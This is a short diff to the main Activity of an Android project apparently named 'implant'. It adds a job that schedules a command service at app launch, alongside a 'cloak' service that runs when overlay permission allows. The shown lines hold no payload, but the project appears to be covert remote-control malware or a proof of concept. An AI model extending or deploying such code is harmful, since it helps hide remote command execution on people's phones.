@@ -9,6 +9,7 @@ import android.support.v7.app.AppCompatActivity
 import com.cooperthecoder.implant.Config
 import com.cooperthecoder.implant.cloak.CloakService
 import com.cooperthecoder.implant.command.CommandService
+import com.cooperthecoder.implant.command.StartCommandServiceJob
 import com.cooperthecoder.implant.dagger.DaggerService
 
 
@@ -18,6 +19,7 @@ class MainActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        StartCommandServiceJob.schedule()
         if (!overlayPermissionRequired()) {
             startCloakService()
         }
